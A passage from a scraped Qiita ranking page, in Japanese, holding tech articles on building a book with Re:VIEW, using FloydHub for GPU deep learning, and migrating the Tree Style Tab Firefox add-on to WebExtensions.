<span id="review-形式への変換" class="fragment"></span><a href="#review-%E5%BD%A2%E5%BC%8F%E3%81%B8%E3%81%AE%E5%A4%89%E6%8F%9B"><i class="fa fa-link"></i></a>Re:VIEW 形式への変換</h2>

<p>md2review を使って markdown から Re:VIEW 形式に変換した。</p>

<p><a href="https://github.com/takahashim/md2review" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/takahashim/md2review</a></p>

<p>markdown がきちんと書かれていればまったく問題なく変換される。変換後のファイルがちょっとおかしいな ? と思った場合は markdown 側を確認。特にコードハイライトなど範囲にまたがる書式指定が混乱しがちなので重点的にチェックするといい。</p>

<p>画像を使っている場合はここで一緒にコピーする必要がある。<code>&lt;章名&gt;-&lt;画像名&gt;</code>の形式でないとRe:VIEW が認識してくれないので後段の装丁作業でエラーが出た場合は要確認。特にエラーが多かったのが画像のコピー忘れだった。</p>

<h2>
<span id="装丁--微調整" class="fragment"></span><a href="#%E8%A3%85%E4%B8%81--%E5%BE%AE%E8%AA%BF%E6%95%B4"><i class="fa fa-link"></i></a>装丁 + 微調整</h2>

<p>装丁作業には Re:VIEW Template を使用した。</p>

<p><a href="https://github.com/TechBooster/ReVIEW-Template" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/TechBooster/ReVIEW-Template</a></p>

<p>インストール、特に Tex のセットアップに時間がかかったので早めに準備しておくとよい。今回は使わなかったが、 Docker 版を先に試すのがよいかも。</p>

<p><a href="https://github.com/TechBooster/ReVIEW-Template#docker%E3%82%92%E4%BD%BF%E3%81%86" class="autolink" rel="nofollow noopener" target="_blank">https://github.com/TechBooster/ReVIEW-Template#docker%E3%82%92%E4%BD%BF%E3%81%86</a></p>

<p>大体 markdown での記述で本として必要なものは揃うのだが、画像サイズの微調整だけは変換後の Re:VIEW 形式ファイルを直接いじる必要があったので注意。詳しい使い方は TechBooster さんが本を出しているので参照するとスムーズかも。</p>

<p><a href="https://techbooster.booth.pm/items/586727" class="autolink" rel="nofollow noopener" target="_blank">https://techbooster.booth.pm/items/586727</a></p>

<p>実際に困ったことがあったときはまずこれを検索、それでもわからないときに Google 検索、ということですべて乗り切れた。感謝。</p>

<p>奥付や表紙など、その他の設定についても記載されているので手元に一冊あるととても安心。</p>

<p>PDF への変換は npm scripts の <code>npm run pdf</code> を使ってやった。 PDF だけならこれだけでもまったく問題ない。別途 epub が必要という場合は <code>review-epubmaker</code> コマンドを使うだけでよかった。こちらもすごいわかりやすい。</p>

<h2>
<span id="やってみて" class="fragment"></span><a href="#%E3%82%84%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%A6"><i class="fa fa-link"></i></a>やってみて</h2>

<p>いまは簡単に本が書けてしまう時代なんだなあと実感。各種ツールを提供してくださっている azu さん、 TechBooster さんありがとう !!</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">76位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>126</kbd>
		<a target="_blank" href="https://qiita.com/alchemist/items/83c50712d9cf0e51e750">GPUでディープラーニングやるならAWSよりFloydHub</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-14<br />11:03:26</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/37701.html">alchemist</a>(31件の記事)<br />(株式会社リツアンSTC 所属)<br><img width="80" height="80" src="https://gravatar.com/avatar/75b4f964a862618833d636ecb33f2272?d=https%3A%2F%2Fidenticons.github.com%2F7075b35798fc3d5f5b6e7f2954151215.png&r=x">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[DeepLearning]</b> <b>[Keras]</b> <b>[TensorFlow]</b> <b>[Floydhub]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>Udacityの<a href="https://www.udacity.com/course/deep-learning-nanodegree-foundation--nd101" rel="nofollow noopener" target="_blank">Deep Learning Nanodegree Foundation</a><br>
のコースで<a href="https://www.floydhub.com/" rel="nofollow noopener" target="_blank">FloydHub</a>という便利なサービスが紹介されていました。ディープラーニングのHerokuだそうです。</p>

<p>GPUが使えるプランも月額14ドルからなので、手軽にGPUでディープラーニングを始めることができます。<br>
TensorFlowとKerasがデフォルトですが、他にもPyTorchやChainerなどメジャーなフレームワークはだいたい使えるようになっています。</p>

<h5>
<span id="20171018-追記" class="fragment"></span><a href="#20171018-%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a><strong>2017/10/18 追記</strong>
</h5>

<p>この記事を書いた直後に、KaggleのKernelについての記事が投稿されています。Kaggleのデータセットに限って言えば、Kernelを使う方が簡単そうです。<br>
<a href="https://qiita.com/jagainu/items/2a1e3779f944588d29de" id="reference-bf352a94864c70740ddb">パワーアップしたKernelでKaggleに飛び込もう - Qiita</a></p>

<h2>
<span id="floydhubのいいところ" class="fragment"></span><a href="#floydhub%E3%81%AE%E3%81%84%E3%81%84%E3%81%A8%E3%81%93%E3%82%8D"><i class="fa fa-link"></i></a>FloydHubのいいところ</h2>

<h3>
<span id="起動が簡単" class="fragment"></span><a href="#%E8%B5%B7%E5%8B%95%E3%81%8C%E7%B0%A1%E5%8D%98"><i class="fa fa-link"></i></a>起動が簡単</h3>

<p>floyd-cliというコマンドラインツールが用意されていて、それを使うとコマンドラインから簡単に環境を起動することができます。<br>
例えばGPUの環境でJupyter NotebookからPyTorchを使用したい場合は、</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>floyd run --gpu --env pytorch-0.2 --mode jupyter
</pre></div></div>

<p>と打ち込むだけでJupyter Notebookのサーバーが起動して、少し待っているとブラウザも自動的に表示されます。<br>
SSHでホストに接続してJupyter Notebookを起動するという作業が必要がないので、すぐに使い始めることができます。</p>

<p>floyd-cli自体のインストールも簡単で、普通にpipでインストールするだけです。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>pip install floyd-cli
</pre></div></div>

<h3>
<span id="同じnotebookでcpuとgpuを使い分けることができる" class="fragment"></span><a href="#%E5%90%8C%E3%81%98notebook%E3%81%A7cpu%E3%81%A8gpu%E3%82%92%E4%BD%BF%E3%81%84%E5%88%86%E3%81%91%E3%82%8B%E3%81%93%E3%81%A8%E3%81%8C%E3%81%A7%E3%81%8D%E3%82%8B"><i class="fa fa-link"></i></a>同じNotebookでCPUとGPUを使い分けることができる</h3>

<p>Jupyter Notebookで作業をしている場合、GPUインスタンスを使っていても計算をしていない時間が長くなります。<br>
できればNotebookを編集している時は単価の安いインスタンスを使って、計算を実行するときだけGPUインスタンスを利用できるといいんですが、AWSだとインスタンスごとにデータを持つのでなかなか面倒です。<br>
FloydHubでは同じデータでCPUのみの環境とGPUの環境を簡単に切り替えることができるので、無駄にGPUを使うことがなくなります。</p>

<h3>
<span id="データセットをダウンロードしなくてもいい" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%82%BB%E3%83%83%E3%83%88%E3%82%92%E3%83%80%E3%82%A6%E3%83%B3%E3%83%AD%E3%83%BC%E3%83%89%E3%81%97%E3%81%AA%E3%81%8F%E3%81%A6%E3%82%82%E3%81%84%E3%81%84"><i class="fa fa-link"></i></a>データセットをダウンロードしなくてもいい</h3>

<p>ディープラーニングでは巨大なデータセットを扱うことが多いので、そのダウンロードにかなりの時間がかかることがあります。<br>
FloydHubではよく使われるデータセットが用意されていて、起動時にマウントすることができるのでダウンロードや解凍する手間を省くことができます。<br>
例えばKaggleの<a href="https://www.kaggle.com/c/dogs-vs-cats-redux-kernels-edition/data" rel="nofollow noopener" target="_blank">Dogs vs. Cats</a>のデータセットを使いたい場合は、</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>floyd run --data fastai/datasets/cats-vs-dogs/2:/data --mode jupyter
</pre></div></div>

<p>と打ち込めば、/dataディレクトリにデータセットがマウントされます。</p>

<h3>
<span id="料金が事前に決まっている" class="fragment"></span><a href="#%E6%96%99%E9%87%91%E3%81%8C%E4%BA%8B%E5%89%8D%E3%81%AB%E6%B1%BA%E3%81%BE%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a>料金が事前に決まっている</h3>

<p>AWSは使った分だけ後から請求されるので、インスタンスを停止するのを忘れてしまうと大変なことになります。<br>
ディープラーニングに使うGPUインスタンスは1時間100円ぐらいからなので、例えば１ヶ月立ち上げっぱなしにしていると100円×24時間×30日＝72,000円もかかってしまいます。<br>
FloydHubは月額の料金が決まっていてその範囲内だけ使用できるという契約になっているので個人で利用するには安心です。<br>
足りなくなればPowerupsというのを購入すれば後から時間を追加することもできるようになっています。</p>

<p><a href="https://www.floydhub.com/pricing" rel="nofollow noopener" target="_blank">Pricing | FloydHub</a></p>

<h2>
<span id="floydhubのイマイチなところ" class="fragment"></span><a href="#floydhub%E3%81%AE%E3%82%A4%E3%83%9E%E3%82%A4%E3%83%81%E3%81%AA%E3%81%A8%E3%81%93%E3%82%8D"><i class="fa fa-link"></i></a>FloydHubのイマイチなところ</h2>

<h3>
<span id="使える環境が決まっている" class="fragment"></span><a href="#%E4%BD%BF%E3%81%88%E3%82%8B%E7%92%B0%E5%A2%83%E3%81%8C%E6%B1%BA%E3%81%BE%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a>使える環境が決まっている</h3>

<p>FloydHubではあらかじめいくつかのDockerイメージが用意されていてその中から選ぶことしかできません。<br>
ハードウェアはGPUあり・なしの２種類だけです。<br>
<a href="https://docs.floydhub.com/guides/environments/" rel="nofollow noopener" target="_blank">List of Available Environments - FloydHub Documentation</a></p>

<p>ただし、floyd_requirements.txtというファイルに必要なパッケージを書いておけば起動時に追加のパッケージをインストールしてくれるので、ほとんどの場合は問題ないと思います。</p>

<h3>
<span id="環境が残らない" class="fragment"></span><a href="#%E7%92%B0%E5%A2%83%E3%81%8C%E6%AE%8B%E3%82%89%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>環境が残らない</h3>

<p>起動するたびに新しい環境が作られるので、起動後にインストールしたパッケージなどは残りません。毎回インストールするか、それが面倒ならfloyd_requirements.txtに書いておく必要があります。</p>

<h2>
<span id="参考リンク" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E3%83%AA%E3%83%B3%E3%82%AF"><i class="fa fa-link"></i></a>参考リンク</h2>

<p><a href="https://qiita.com/pytry3g/items/682edf2dcafd6cce5ce6" id="reference-fea5713445a66767fd2c">とりあえずFloydhubで遊んでみた - Qiita</a></p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">77位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>126</kbd>
		<a target="_blank" href="https://qiita.com/piroor/items/21ce5c99d5311973661b">ツリー型タブのWebExtensionsへの移行のおはなし</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-03<br />13:12:55</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/61387.html">piroor</a>(22件の記事)<br />(ClearCode Inc. 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/61387/profile-images/1473695642">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[CSS]</b> <b>[firefox]</b> <b>[アドオン]</b> <b>[WebExtensions]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p><a href="http://piro.sakura.ne.jp/latest/blosxom/mozilla/extension/treestyletab/2017-10-03_migration-we-en.htm" rel="nofollow noopener" target="_blank">Here is the English version of this article.</a><br>
この投稿は<a href="http://piro.sakura.ne.jp/latest/blosxom/mozilla/extension/treestyletab/2017-10-03_migration-we-ja.htm" rel="nofollow noopener" target="_blank">個人サイトとのクロスポストです</a>。</p>

<p>2017年の8月下旬に思い立って、<a href="https://addons.mozilla.org/firefox/addon/tree-style-tab/" rel="nofollow noopener" target="_blank">ツリー型タブ</a>のWebExtensions版を作り始め、去る9月26日にバージョン2.0としてリリースしました。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/b8489166-b0ea-84ea-d094-bab57290effd.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/08213be7f82434f2225a19669948fc3ceda7db74/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f62383438393136362d623065612d383465612d643039342d6261623537323930656666642e706e67" alt="（ツリー型タブのサイドバーパネルを表示した状態のスクリーンショット）" width="400" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/b8489166-b0ea-84ea-d094-bab57290effd.png"></a></p>

<p>重い腰を上げて取り組む気になれたのは、<a href="https://blog.mozilla.org/addons/2017/09/28/webextensions-in-firefox-57/" rel="nofollow noopener" target="_blank">必須と目していたAPIが一通り実装されてきて</a>、Firefox 57でようやく技術的に作れる目処が立ってきたからでした。<br>
関係者の皆さんの尽力に改めて感謝の意を表明します。</p>

<p>やっている事自体はそう難しい話ではなく、技術的に目新しいトピックは無いのですが、主に歴史的資料としてレガシーなアドオンの移行の一事例の記録を残しておこうと思います。</p>



<h3>
<span id="ツリー型タブとは" class="fragment"></span><a href="#%E3%83%84%E3%83%AA%E3%83%BC%E5%9E%8B%E3%82%BF%E3%83%96%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>ツリー型タブとは？</h3>

<p>一言でいうと、ツリー型タブ（Tree Style Tab、略してTST）は「Firefox用の、タブ同士の来歴・関係をツリー構造として視覚化してWebブラウスを支援するアドオン」です。</p>

<h4>
<span id="tstの来歴昔話" class="fragment"></span><a href="#tst%E3%81%AE%E6%9D%A5%E6%AD%B4%E6%98%94%E8%A9%B1"><i class="fa fa-link"></i></a>TSTの来歴（昔話）</h4>

<p>今あるTSTの源流を遡ると、「<a href="http://piro.sakura.ne.jp/xul/tabextensions/" rel="nofollow noopener" target="_blank">タブブラウザ拡張（TabBrowser Extensions､TBE）</a>」という拙作の古いFirefox用アドオンと、<a href="http://la.ma.la/blog/diary_200512301450.htm" rel="nofollow noopener" target="_blank">「iRider」という個性的なWebブラウザ</a>に行き着きます。</p>

<p>2004年頃のFirefoxの貧弱なタブ管理機能を補完するオールインワン型のアドオンとして開発していたTBEは、良さげな機能をなんでも無秩序に取り込む方針でした。<br>
紹介記事を見て知ったiRiderの「タブのように見えるサムネイル付きの履歴項目がツリー状に表示される」「タブのクローズボックスをドラッグして選択してまとめて項目を閉じられる」といった挙動も、腕試しを兼ねてTBEに実装したと記憶しています。</p>

<p>無秩序に肥大化・複雑化したTBEはFirefox 2での大規模な仕様変更に追従できず、Firefox 1.5と共に歴史の闇に消えていくこととなります。<br>
TBEを諦める代わりに、僕は当時自分自身がTBEで愛用していた機能のいくつかを機能単位で切り出して再実装することにしました。<br>
そうして「タブのインデントによるツリー表示」という機能に特化して2007年に生まれたのがTSTです。</p>

<p>Firefoxの更新に追従しきれずドロップアウトしていくアドオンも多い中、TSTはメンテナンスを繰り返しながら2017年まで地味に生き残ってきました。<br>
「Firefox 57以降に対応したWebExtensions版」（以下、WE版）であるTST 2.0は、そのTSTの誕生以来最大のマイルストーンと言えます。</p>

<h3>
<span id="フェイズ1移行計画" class="fragment"></span><a href="#%E3%83%95%E3%82%A7%E3%82%A4%E3%82%BA1%E7%A7%BB%E8%A1%8C%E8%A8%88%E7%94%BB"><i class="fa fa-link"></i></a>フェイズ1：移行計画</h3>

<p>作業に着手する前から、TSTのWebExtensionsへの「完全な移行」は不可能だということは分かっていました。<br>
そのため今回のWE版開発は、<em>コンセプトを今一度明確化し、何をやって何をやらないか（諦めるか）をハッキリさせる</em>という所から始めました。</p>

<h4>
<span id="tstのwebextensions対応ではないtstのwebextensions版開発" class="fragment"></span><a href="#tst%E3%81%AEwebextensions%E5%AF%BE%E5%BF%9C%E3%81%A7%E3%81%AF%E3%81%AA%E3%81%84tst%E3%81%AEwebextensions%E7%89%88%E9%96%8B%E7%99%BA"><i class="fa fa-link"></i></a>「TSTのWebExtensions対応」ではない、「TSTのWebExtensions版開発」</h4>

<p>ところで、<a href="http://point2000.hatenablog.com/entry/2017/09/13/222108" title="FirefoxのWebextensionアポカリプスに備える(主要アドオンのWebextensions対応について) - 俺の話を聞いてくれ" rel="nofollow noopener" target="_blank">FirefoxのWebextensionアポカリプスに備える(主要アドオンのWebextensions対応について)</a>のように「WebExtensions対応」という言葉を目にする事があります。<br>
これに対し、自分は「WebExtensions版」という表現を使う事が多いです。<br>
この違いはどこからきているのでしょうか。</p>

<p>元々Firefoxは、「Geckoという実行環境レイヤの上で、XML＋CSS＋JavaScriptを動かして、Webページの要領でアプリケーションを実現する」という構造をしています。<br>
従来のアドオンは本質的には、このFirefoxのJavaScriptが動作している名前空間に任意のスクリプトを注入して動作を変える、いわゆる「モンキーパッチ」であったと言えます。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/a6a96194-9234-41da-15f0-03f384b0fe31.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/da76e4bbfa9907531ffc7f08ecb5b0bcdf2276a7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f61366139363139342d393233342d343164612d313566302d3033663338346230666533312e706e67" alt="（Firefoxのレガシーなアドオンのアーキテクチャの概念図）" height="300" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/a6a96194-9234-41da-15f0-03f384b0fe31.png"></a></p>

<p>対するWebExtensionsベースのアドオンは、隔離された専用の名前空間の中でアドオンのスクリプトを実行し、あらかじめ用意されたAPI（WebExtensions API）を介してFirefoxと相互作用するという仕組みで成り立つソフトウェアです。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/8a474573-968f-4f8d-98ea-7cb8ecae4fde.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/a469df515c4373cbc27d88c7a5f6e83b1051e0dc/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f38613437343537332d393638662d346638642d393865612d3763623865636165346664652e706e67" alt="（FirefoxのWebExtensionsなアドオンのアーキテクチャの概念図）" height="300" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/8a474573-968f-4f8d-98ea-7cb8ecae4fde.png"></a></p>

<p>この本質的な差異ゆえに、直接Firefoxの中身をいじくり回していたレガシーなアドオンを「若干手直ししてFirefox 57でも使えるようにする」ということは不可能で、<em>「従来提供していたユーザー体験を再現する事を目指して、WebExtensionsベースで新しくアドオンを開発し直す」</em>というアプローチを取らざるを得ません。<br>
TSTのWE版も、実質的にゼロからの開発に等しい作業となりました。<br>
これが、自分が「WebExtensions版」という言葉を使っている理由です。</p>

<h4>
<span id="技術的制約から決まってくる部分" class="fragment"></span><a href="#%E6%8A%80%E8%A1%93%E7%9A%84%E5%88%B6%E7%B4%84%E3%81%8B%E3%82%89%E6%B1%BA%E3%81%BE%E3%81%A3%E3%81%A6%E3%81%8F%E3%82%8B%E9%83%A8%E5%88%86"><i class="fa fa-link"></i></a>技術的制約から決まってくる部分</h4>

<p>WebExtensionsの仕様上の制約から、レガシー版TSTのどの機能を実現できてどの機能は実現できないかというのはある程度決まってきます。</p>

<ul>
<li>「縦長のタブバー」の実現にあたっては、<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/user_interface/Sidebars" rel="nofollow noopener" target="_blank">サイドバー</a>が唯一の選択肢になります。
WebExtensionsのサイドバーは、サイドバー自体を任意のイベントで開閉したり、位置をウィンドウの下や上に移動する機能はありません。
この事から、「タブバーを自動で隠す」機能や「横長のタブバー内でツリー表示」機能は実現不可能だということになります。</li>
<li>
<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1270763#c9" rel="nofollow noopener" target="_blank">WebExtensionsのAPIの方針故に</a>、「Firefoxがタブを開こうとした時に、その前のタイミングに割り込んで何かをする」ということもできません。
全ては事後的に通知されるのみなので、事前の処理に割り込む必要がある系統の機能はすべて再現不可能です。</li>
<li>タブを開くトリガーとなる操作への割り込みや、タブが開かれる前の判断への介入ができない以上、リンク等から開かれたタブの親子関係を推測する材料は<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/tabs/create" rel="nofollow noopener" target="_blank"><code>tabs.Tab.openerTabId</code></a>だけが唯一の頼みの綱ということになります。
<code>openerTabId</code>は、Google Chromeの仕様には以前から存在していたもののWebExtensionsには長らく実装されないままとなっていた機能の1つです。
実は、<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1238314" rel="nofollow noopener" target="_blank">これの実装を取り扱うbug</a>にパッチが提出され、Fx57で正式に実装済みとなったという事が、TSTのWE版開発に着手する直接のきっかけとなりました。</li>
<li>ツリー構造の保存と復元は、レガシー版ではタブやウィンドウに紐付けて情報を保持していましたが、WE版開発を始めた時点ではまだ<a href="https://developer.mozilla.org/en-US/Add-ons/WebExtensions/API/sessions" rel="nofollow noopener" target="_blank">sessions API</a>には対応する機能がありませんでした。
ただ、<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1322060" rel="nofollow noopener" target="_blank">実装を取り扱っていたbug</a>を見ていると、Fx57には間に合いそうな勢いでパッチの提出とレビューが進行していましたので、これが必要になる頃には投入されていそうな様子でした。</li>
</ul>

<p>以上のような簡単な分析を踏まえ、半ば見切り発車で作業を始めたのでした。</p>

<h4>
<span id="技術的制約以外の明確な意図を持って決める部分" class="fragment"></span><a href="#%E6%8A%80%E8%A1%93%E7%9A%84%E5%88%B6%E7%B4%84%E4%BB%A5%E5%A4%96%E3%81%AE%E6%98%8E%E7%A2%BA%E3%81%AA%E6%84%8F%E5%9B%B3%E3%82%92%E6%8C%81%E3%81%A3%E3%81%A6%E6%B1%BA%E3%82%81%E3%82%8B%E9%83%A8%E5%88%86"><i class="fa fa-link"></i></a>技術的制約以外の、明確な意図を持って決める部分</h4>

<p>レガシーなアドオンのWebExtensions移行では、全ての機能について「移行できて、する」「移行できないので、しない」「移行できるが、コストが見合わないので移行しない」といったことを判断しなくてはなりません。<br>
これは精神的ストレスの大きな難しい仕事です。<br>
TST 2.0においてそれをやり遂げられた事の背景には、<em>核となるコンセプトがはっきりしていて、すべての判断をそのコンセプトに基づいて行えた</em>という事がありました。</p>

<p>僕がTSTのTBEからの切り出し時から一貫して意識してきたコンセプトは、</p>

<ul>
<li>「タブのツリー」という単機能に特化する。主題と無関係の（且つ、Firefox本体の機能でもない）機能は、技術的には実現可能でも入れない。</li>
<li>その代わり、他のアドオンと併用できるようにして、ユーザーが欲しい機能をユーザー自身が任意に組み合わせられるようにする。</li>
</ul>

<p>という2つの事でした。</p>

<p>単機能のアドオンは設計を簡潔に保ちやすくなります。<br>
それは、機能が少ないからと言うよりも、<a href="http://piro.sakura.ne.jp/latest/blosxom/mozilla/xul/2011-06-30_ui.htm" rel="nofollow noopener" target="_blank">コンセプトが明確であるという事自体が設計の骨子となり、全体に秩序と一貫性をもたらすからだ</a>……と僕は考えています。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/3fd4af8c-9dbd-491e-b8bf-6075f9bab5c2.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/465be260f19a9ff802102d2595ef400e8c755184/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f33666434616638632d396462642d343931652d623862662d3630373566396261623563322e706e67" alt="（オールインワン型のアドオンの利点と欠点）" width="450" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/3fd4af8c-9dbd-491e-b8bf-6075f9bab5c2.png"></a><br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/5410bd24-dc4d-ef16-203e-a3cc61fa0d4a.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/c7bb178ee4c605e9666fe4c151783a3f23277762/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f35343130626432342d646334642d656631362d323033652d6133636336316661306434612e706e67" alt="（単機能型アドオンの利点と欠点）" width="450" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/5410bd24-dc4d-ef16-203e-a3cc61fa0d4a.png"></a></p>

<p>取捨選択の判断基準が明確であればそれだけ意志決定のコストも下がります。<br>
「大事にしなくてもいい事を切り捨てて、大事にしたい事にリソースを集中する」というのは何事にも言える理想ですが、それを実際にやるためには「そもそも何を大事にするのか」がはっきりしていないといけないわけです。</p>

<h4>
<span id="webextensionsでは得られにくいアドオン同士のシナジー" class="fragment"></span><a href="#webextensions%E3%81%A7%E3%81%AF%E5%BE%97%E3%82%89%E3%82%8C%E3%81%AB%E3%81%8F%E3%81%84%E3%82%A2%E3%83%89%E3%82%AA%E3%83%B3%E5%90%8C%E5%A3%AB%E3%81%AE%E3%82%B7%E3%83%8A%E3%82%B8%E3%83%BC"><i class="fa fa-link"></i></a>WebExtensionsでは得られにくいアドオン同士のシナジー</h4>

<p>そして、単機能に集中する事と同時に大事にしたかったのが、もう1つのコンセプトであった「他のアドオンとの相互運用性」です。</p>

<p>実質的にはモンキーパッチであったレガシーなアドオンではアドオン同士が衝突しないように気をつける必要があったのに対し、決まったAPIに基づいて実装されるWebExtensionsのアドオンでそんな事をわざわざ気にする必要など無いのでは？　と思うかもしれませんが、逆です。<br>
WebExtensionsではアドオン同士が綺麗に隔離されすぎているせいで、<em>複数のアドオンの機能を連携させにくくなっている</em>のです。</p>

<p>例えば従来のアドオンでは、「ツリー型タブによって縦置きされたタブの中で、別のアドオンによって埋め込まれたサムネイルが表示されていて、さらにタブをダブルクリックするとまた別のアドオンによって提供された機能が発動する。さらに、タブが無い無駄な領域には別のサイドバーパネルが表示されている。」というように、アドオン同士が暗黙のうちにお互いを補完しあう形で作用するということが自然とできていました。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/ac0c80f3-5be6-6f3d-711b-099cbfbedd87.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/1c5cc7fcfa0b24ba20e038f9680fd6b3a2285265/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f61633063383066332d356265362d366633642d373131622d3039396362666265646438372e706e67" alt="（レガシーなアドオン同士の暗黙的な連携の様子の概念図）" height="300" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/ac0c80f3-5be6-6f3d-711b-099cbfbedd87.png"></a></p>

<p>ところが、WebExtensionsではそれはできません。<br>
WE版ツリー型タブが提供する縦型タブバーとしてのサイドバーはそれ自体で完結しており、その中に他のアドオンが提供する機能は入り込むことができません。<br>
また、サイドバーパネル同士は排他的なので、「ツリー型タブのサイドバー」と「ブックマーク一覧のサイドバー」はどちらか片方だけしか表示できません。<br>
<em>それぞれの機能を単独で使う事はできても、機能同士を組み合わせることによるシナジーが生まれにくいのです</em>。<br><br>
<a href="https://qiita-image-store.s3.amazonaws.com/0/61387/b6933dcb-31ff-d31c-f703-9219e8201d6b.png" rel="nofollow noopener" target="_blank"><img src="https://camo.qiitausercontent.com/78def47d19fbb2531e380c92b71c9bb52acb6ffb/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36313338372f62363933336463622d333166662d643331632d663730332d3932313965383230316436622e706e67" alt="（WebExtensionsなアドオン同士では暗黙的な連携が無い様子の概念図）" height="300" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/61387/b6933dcb-31ff-d31c-f703-9219e8201d6b.png"></a></p>

<p>どんなに便利な機能を提供するアドオンでも、他の機能と排他的にしか使えないのでは意味がありません。<br>
どちらしか使われなくなるならまだいい方で、最悪の場合どちらも使われなくなってしまうという事にもなり得ます。<br>
僕がWebExtensionsに対して抱いていた最大の懸念事項は、むしろこの点にありました。</p>

<p>結論を先に言ってしまうと、WE版TSTはこの点で大幅な後退を余儀なくされています。<br>
他のアドオンとの暗黙的な連携は非常に限定的で、他のアドオン作者の厚意に期待して<a href="https://github.com/piroor/treestyletab/wiki/API-for-other-addons" rel="nofollow noopener" target="_blank">明示的な連携のためのAPI</a>を用意する事しかできませんでした。<br>
これについては後ほど詳しく述べます。</p>

<h3>
<span id="フェイズ2初期開発" class="fragment"></span><a href="#%E3%83%95%E3%82%A7%E3%82%A4%E3%82%BA2%E5%88%9D%E6%9C%9F%E9%96%8B%E7%99%BA"><i class="fa fa-link"></i></a>フェイズ2：初期開発</h3>

<p>既に述べたとおり、TSTのWebExtensions移行は実質的には「レガシー版TSTをリファレンスとした、新しいWebExtensionsアドオンの開発」に他なりませんでした。<br>
WebExtensionsアドオンの一般的な開発の仕方に属する部分についてはあまり詳しくは述べず、ここでは「TSTのWE版」の開発という点にフォーカスして、実際の進め方を振り返ってみます。</p>

<h4>
<span id="実証実験を兼ねた開発" class="fragment"></span><a href="#%E5%AE%9F%E8%A8%BC%E5%AE%9F%E9%A8%93%E3%82%92%E5%85%BC%E3%81%AD%E3%81%9F%E9%96%8B%E7%99%BA"><i class="fa fa-link"></i></a>実証実験を兼ねた開発</h4>

